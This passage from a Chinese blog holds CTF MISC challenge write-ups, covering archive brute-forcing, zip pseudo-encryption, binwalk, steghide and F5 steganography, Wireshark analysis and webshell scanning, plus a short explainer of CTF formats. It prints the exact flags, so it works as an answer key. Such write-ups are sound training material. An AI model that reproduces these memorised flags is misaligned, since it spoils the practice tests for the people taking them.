title="第十一题：rar"></a>第十一题：rar</h2><p>发现是个压缩包，爆破得到</p><img src="/2021/11/29/MISC/20.png" class=""><p>打开得到flag{1773c5da790bd3caff38e3decd180eb7}</p><h2 id="十二题：zip伪加密"><a href="#十二题：zip伪加密" class="headerlink" title="十二题：zip伪加密"></a>十二题：zip伪加密</h2><p>根据题目的易知这是个伪加密类型<br>扔到二进制编辑器<br>核心目录区的通用标记位距离核心目录区头504B0102的偏移为8字节，其本身占2字节，最低位表示这个文件是否被加密，将其改为0x01后，再次打开会提示输入密码，但这时文件内容并没有真正被加密，所以被称为伪加密，只要将该标志位重新改回0，即可正常打开</p><img src="/2021/11/29/MISC/21.png" class=""><p>flag{Adm1N-B2G-kU-SZIP}</p><h2 id="十三题：qr"><a href="#十三题：qr" class="headerlink" title="十三题：qr"></a>十三题：qr</h2><p>扫一下得</p><img src="/2021/11/29/MISC/22.png" class=""><p>flag{878865ce73370a4ce607d21ca01b5e59}</p><h2 id="十四题：被嗅探的流量"><a href="#十四题：被嗅探的流量" class="headerlink" title="十四题：被嗅探的流量"></a>十四题：被嗅探的流量</h2><p>直接查找flag，成功发现</p><img src="/2021/11/29/MISC/23.png" class=""><h2 id="十五题：镜子里面的世界"><a href="#十五题：镜子里面的世界" class="headerlink" title="十五题：镜子里面的世界"></a>十五题：镜子里面的世界</h2><p>先用二进制编辑器打开，发现啥都没有，<br>用StegSolve打开发现red 0 ,green 0 ,blue 0 通道有问题，接着分离出来，</p><img src="/2021/11/29/MISC/24.png" class=""><p>分离成.txt文件，</p><img src="/2021/11/29/MISC/25.png" class=""><p>得到flag{st3g0_saurus_wr3cks}</p><h2 id="十六题：ningen"><a href="#十六题：ningen" class="headerlink" title="十六题：ningen"></a>十六题：ningen</h2><p>这题目描述有点中二，不管他先用二进制编辑器打开</p><img src="/2021/11/29/MISC/26.png" class=""><p>发现了不得了的东西，里面有一个压缩包，打开虚拟机，直接用binwalk 分离出来，打开kali,输入binwalk 文件地址，发现其中果然有东西，输入binwalk -e 文件地址得到一个压缩包，</p><img src="/2021/11/29/MISC/27.png" class=""><p>接着爆破这个压缩包</p><img src="/2021/11/29/MISC/28.png" class=""><p>得到密码：8368<br>打开得到flag{b025fc9ca797a67d2103bfbc407a6d5f}</p><h2 id="十七题：小明的保险箱"><a href="#十七题：小明的保险箱" class="headerlink" title="十七题：小明的保险箱"></a>十七题：小明的保险箱</h2><p>先用二进制编辑器打开</p><img src="/2021/11/29/MISC/29.png" class=""><p>发现隐藏了个.rar<br>binwalk 分离出来，和上题一样，爆破</p><img src="/2021/11/29/MISC/30.png" class=""><p>得到密码，打开得到flag{75a3d68bf071ee188c418ea6cf0bb043}</p><h2 id="十八题：爱因斯坦"><a href="#十八题：爱因斯坦" class="headerlink" title="十八题：爱因斯坦"></a>十八题：爱因斯坦</h2><p>先用二进制编辑器打开</p><img src="/2021/11/29/MISC/31.png" class=""><img src="/2021/11/29/MISC/32.jpg" class=""><p>同上用binwalk分离出来，得到了一个压缩包，破解了半天没出来，感觉事情不对，弄了半天没弄出来，后来在图片的属性中发现了一个神奇的语句</p><img src="/2021/11/29/MISC/32.png" class=""><p>试了一下发现就是这个<br>得到flag{dd22a92bf2cceb6c0cd0d6b83ff51606}</p><h2 id="十九题：easycap"><a href="#十九题：easycap" class="headerlink" title="十九题：easycap"></a>十九题：easycap</h2><p>用Wireshark打开，发现全是TCP流<br>追踪TCP流：得到</p><img src="/2021/11/29/MISC/33.png" class=""><p>得到flag</p><h2 id="二十题：隐藏的钥匙"><a href="#二十题：隐藏的钥匙" class="headerlink" title="二十题：隐藏的钥匙"></a>二十题：隐藏的钥匙</h2><p>拖进010，查找flag发现</p><img src="/2021/11/29/MISC/34.png" class=""><p>是base64编码，到网上一查得到flag.</p><h2 id="二十二题：另外一个世界"><a href="#二十二题：另外一个世界" class="headerlink" title="二十二题：另外一个世界"></a>二十二题：另外一个世界</h2><p>拖进010，发现在文件尾出现了一串神秘代码</p><img src="/2021/11/29/MISC/35.png" class=""><p>将得到的二进制代码分为八个一组，存到文件里<br>使用python写一个脚本</p><pre><code>file = open(&quot;二进制.txt&quot;,&quot;r&quot;)text = file.readlines()list1 =&quot;&quot;for list in text:    list1 += chr(int (list,2))print(list1)file.close()</code></pre><p>解码得到 koekj3s 自行加上flag{}即可</p><h2 id="二十三题：FLAG"><a href="#二十三题：FLAG" class="headerlink" title="二十三题：FLAG"></a>二十三题：FLAG</h2><p>先拖入stegsolve进行LSB分析，发现有一个压缩包</p><img src="/2021/11/29/MISC/36.png" class=""><p>虽然显示压缩包损坏，但并不影响解压，将解压后的文件导出拖到010得到<br>以个ELF的文件</p><img src="/2021/11/29/MISC/37.png" class="">从网上搜索可知这个文件可以直接在Linux里打开，成功得到hctf{dd0gf4c3tok3yb0ard4g41n~~~}    <p>按要求改一下就行了。</p><h2 id="二十四题：假如给我三天光明"><a href="#二十四题：假如给我三天光明" class="headerlink" title="二十四题：假如给我三天光明"></a>二十四题：假如给我三天光明</h2><p>根据图片下的盲文对照表可得到压缩包的密码：kmdono<br>将压缩包解压缩之后的音频是一段摩斯电码：</p><pre><code>-.-./-/..-./.--/.--././../-----/---../--.../...--/..---/..--../..---/...--/-../--..</code></pre><p>解密后可得到：CTFWPEI08732?23DZ<br>转成小写按照格式输入即可</p><h2 id="二十五题：神秘的龙卷风"><a href="#二十五题：神秘的龙卷风" class="headerlink" title="二十五题：神秘的龙卷风"></a>二十五题：神秘的龙卷风</h2><p>将所得压缩包暴力破解之后，得到brainfuck密码，将brainfuck密码解码之后得到flag</p><h2 id="二十六题：后门查杀"><a href="#二十六题：后门查杀" class="headerlink" title="二十六题：后门查杀"></a>二十六题：后门查杀</h2><p>将下载的文件丢到D盾里扫一下</p><img src="/2021/11/29/MISC/38.png" class=""><img src="/2021/11/29/MISC/39.png" class=""><p>6ac45fb83b3bc355c024f5034b947dd3</p><p>被题目条件给迷惑了，后来发现直接包上flag{}即可</p><h2 id="二十七题：数据包中的线索"><a href="#二十七题：数据包中的线索" class="headerlink" title="二十七题：数据包中的线索"></a>二十七题：数据包中的线索</h2><p>将下载的文件丢到Wireshark里，先过滤http流试试，发现有数据往来.</p><img src="/2021/11/29/MISC/40.png" class=""><img src="/2021/11/29/MISC/41.png" class=""><p>发现一串base64的编码，将base64编码转为图片，得到flag。</p><h2 id="二十八题：荷兰宽带数据泄露"><a href="#二十八题：荷兰宽带数据泄露" class="headerlink" title="二十八题：荷兰宽带数据泄露"></a>二十八题：荷兰宽带数据泄露</h2><h2 id="二十九题：来首歌吧"><a href="#二十九题：来首歌吧" class="headerlink" title="二十九题：来首歌吧"></a>二十九题：来首歌吧</h2><p>一个简单的摩斯密码，解密即可得到flag</p><h2 id="三十题：webshell后门"><a href="#三十题：webshell后门" class="headerlink" title="三十题：webshell后门"></a>三十题：webshell后门</h2><p>将文件丢入D盾里扫一下</p><img src="/2021/11/29/MISC/42.png" class=""><p>有两个后门的提示，挨个找一下，发现密码。</p><img src="/2021/11/29/MISC/43.png" class=""><p>直接包上flag{}即可</p><h2 id="三十一题：面具下的flag"><a href="#三十一题：面具下的flag" class="headerlink" title="三十一题：面具下的flag"></a>三十一题：面具下的flag</h2><p>先用binwalk分离出里面的压缩包，后发现是伪加密，修改之后放到kali里，执行：</p><pre><code>7z x /root/桌面/_mianju.jpg.extracted/flag.vmdk -r -o/root/桌面</code></pre><p>x  代表解压缩文件，并且是按原始目录树解压（还有个参数 e 也是解压缩文件，但其会将所有文件都解压到根下，而不是自己原有的文件夹下）</p><p>-r 表示递归解压缩所有的子文件夹</p><p>-o 是指定解压到的目录，-o后是没有空格的，直接接目录。这一点需要注意。</p><p>解后得到两种密码</p><img src="/2021/11/29/MISC/44.png" class=""><p>左边的是0ok!密码，右边的是Brainfuck密码,这里推荐一个解密网站:</p><pre><code>https://www.splitbrain.org/services/ook</code></pre><p>解密之后拼接起来即可得到flag</p><h2 id="三十二题：九连环"><a href="#三十二题：九连环" class="headerlink" title="三十二题：九连环"></a>三十二题：九连环</h2><p>先用binwalk分离出来一个压缩包，后发现这只是一个普通的压缩包，使用弱密码爆破也不成功，猜测密码在那张图片里，后用010打开找不到flag,没办法只得求助大佬，通过大佬的博客发现要使用一个叫做steghide来查看隐藏的内容，这个东西kali里直接就有，所以直接使用命令成功得到密码：bV1g6t5wZDJif^J7</p><pre><code>steghide extract -sf 文件路径</code></pre><img src="/2021/11/29/MISC/45.png" class=""><p>成功得到flag{1RTo8w@&amp;4nK@z*XL}</p><h2 id="三十三题：被劫持的神秘礼物"><a href="#三十三题：被劫持的神秘礼物" class="headerlink" title="三十三题：被劫持的神秘礼物:"></a>三十三题：被劫持的神秘礼物:</h2><p>我们得到一个流量包，拖进Wireshark分析一下，追踪一下HTTP流</p><img src="/2021/11/29/MISC/46.png" class=""><img src="/2021/11/29/MISC/47.png" class=""><p>得到账号：admina,密码：adminb,使用MD5小写加密一下得到flag</p><h2 id="三十三题-刷新过的图片："><a href="#三十三题-刷新过的图片：" class="headerlink" title="三十三题:刷新过的图片："></a>三十三题:刷新过的图片：</h2><p>拿到题目一顿分析，啥也分析不出来。看了一下大佬的wp才知道有种叫做F5隐写的东西，GitHub下载链接：<br>    <a href="https://github.com/matthewgao/F5-steganography">https://github.com/matthewgao/F5-steganography</a></p><pre><code>java Extract /绝对路径 [-p 密码] [-e 输出文件]</code></pre><img src="/2021/11/29/MISC/48.png" class=""><p>在文件的目录下得到一个output.txt的文件，发现是个压缩包格式，果断把后缀名改为.zip<br>后发现有密码，经过分析得到是一个伪加密，改回来解压缩得到flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF</title>
      <link href="/2021/10/07/CTF/"/>
      <url>/2021/10/07/CTF/</url>
      
        <content type="html"><![CDATA[<p>[[文件包含漏洞]][[文件上传upload-labs通关教程]][[PHP反序列化]][[PHP伪协议详解]][[sqlilabs通关教程]][[xss-labs通关教程]][[Token]][[BurpSuite]][[攻防世界web]][[MISC]]</p><h1 id="CTF是一种流行的信息安全竞赛形式，其英文名可直译为“夺得Flag”，也可意译为“夺旗赛”。其大致流程是，参赛团队之间通过进行攻防对抗、程序分析等形式，率先从主办方给出的比赛环境中得到一串具有一定格式的字符串或其他内容，并将其提交给主办方，从而夺得分数。为了方便称呼，我们把这样的内容称之为“Flag”。"><a href="#CTF是一种流行的信息安全竞赛形式，其英文名可直译为“夺得Flag”，也可意译为“夺旗赛”。其大致流程是，参赛团队之间通过进行攻防对抗、程序分析等形式，率先从主办方给出的比赛环境中得到一串具有一定格式的字符串或其他内容，并将其提交给主办方，从而夺得分数。为了方便称呼，我们把这样的内容称之为“Flag”。" class="headerlink" title="CTF是一种流行的信息安全竞赛形式，其英文名可直译为“夺得Flag”，也可意译为“夺旗赛”。其大致流程是，参赛团队之间通过进行攻防对抗、程序分析等形式，率先从主办方给出的比赛环境中得到一串具有一定格式的字符串或其他内容，并将其提交给主办方，从而夺得分数。为了方便称呼，我们把这样的内容称之为“Flag”。"></a>CTF是一种流行的信息安全竞赛形式，其英文名可直译为“夺得Flag”，也可意译为“夺旗赛”。其大致流程是，参赛团队之间通过进行攻防对抗、程序分析等形式，率先从主办方给出的比赛环境中得到一串具有一定格式的字符串或其他内容，并将其提交给主办方，从而夺得分数。为了方便称呼，我们把这样的内容称之为“Flag”。</h1><h1 id="CTF竞赛模式具体分为以下三类："><a href="#CTF竞赛模式具体分为以下三类：" class="headerlink" title="CTF竞赛模式具体分为以下三类："></a>CTF竞赛模式具体分为以下三类：</h1><h1 id="一、解题模式（Jeopardy）"><a href="#一、解题模式（Jeopardy）" class="headerlink" title="一、解题模式（Jeopardy）"></a>一、解题模式（Jeopardy）</h1><h1 id="在解题模式CTF赛制中，参赛队伍可以通过互联网或者现场网络参与，这种模式的CTF竞赛与ACM编程竞赛、信息学奥赛比较类似，以解决网络安全技术挑战题目的分值和时间来排名，通常用于在线选拔赛。题目主要包含逆向、漏洞挖掘与利用、Web渗透、密码、取证、隐写、安全编程等类别。"><a href="#在解题模式CTF赛制中，参赛队伍可以通过互联网或者现场网络参与，这种模式的CTF竞赛与ACM编程竞赛、信息学奥赛比较类似，以解决网络安全技术挑战题目的分值和时间来排名，通常用于在线选拔赛。题目主要包含逆向、漏洞挖掘与利用、Web渗透、密码、取证、隐写、安全编程等类别。" class="headerlink" title="在解题模式CTF赛制中，参赛队伍可以通过互联网或者现场网络参与，这种模式的CTF竞赛与ACM编程竞赛、信息学奥赛比较类似，以解决网络安全技术挑战题目的分值和时间来排名，通常用于在线选拔赛。题目主要包含逆向、漏洞挖掘与利用、Web渗透、密码、取证、隐写、安全编程等类别。"></a>在解题模式CTF赛制中，参赛队伍可以通过互联网或者现场网络参与，这种模式的CTF竞赛与ACM编程竞赛、信息学奥赛比较类似，以解决网络安全技术挑战题目的分值和时间来排名，通常用于在线选拔赛。题目主要包含逆向、漏洞挖掘与利用、Web渗透、密码、取证、隐写、安全编程等类别。</h1><h1 id="二、攻防模式（Attack-Defense）"><a href="#二、攻防模式（Attack-Defense）" class="headerlink" title="二、攻防模式（Attack-Defense）"></a>二、攻防模式（Attack-Defense）</h1><h1 id="在攻防模式CTF赛制中，参赛队伍在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手服务来得分，修补自身服务漏洞进行防御来避免丢分。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续48小时及以上），同时也比团队之间的分工配合与合作。-1"><a href="#在攻防模式CTF赛制中，参赛队伍在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手服务来得分，修补自身服务漏洞进行防御来避免丢分。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续48小时及以上），同时也比团队之间的分工配合与合作。-1" class="headerlink" title="在攻防模式CTF赛制中，参赛队伍在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手服务来得分，修补自身服务漏洞进行防御来避免丢分。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续48小时及以上），同时也比团队之间的分工配合与合作。 [1]"></a>在攻防模式CTF赛制中，参赛队伍在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手服务来得分，修补自身服务漏洞进行防御来避免丢分。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续48小时及以上），同时也比团队之间的分工配合与合作。 [1]</h1><h1 id="三、混合模式（Mix）"><a href="#三、混合模式（Mix）" class="headerlink" title="三、混合模式（Mix）"></a>三、混合模式（Mix）</h1><h1 id="结合了解题模式与攻防模式的CTF赛制，比如参赛队伍通过解题可以获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏，最终以得分高低分出胜负。采用混合模式CTF赛制的典型代表际CTF竞赛。"><a href="#结合了解题模式与攻防模式的CTF赛制，比如参赛队伍通过解题可以获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏，最终以得分高低分出胜负。采用混合模式CTF赛制的典型代表际CTF竞赛。" class="headerlink" title="结合了解题模式与攻防模式的CTF赛制，比如参赛队伍通过解题可以获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏，最终以得分高低分出胜负。采用混合模式CTF赛制的典型代表际CTF竞赛。"></a>结合了解题模式与攻防模式的CTF赛制，比如参赛队伍通过解题可以获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏，最终以得分高低分出胜负。采用混合模式CTF赛制的典型代表际CTF竞赛。</h1>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
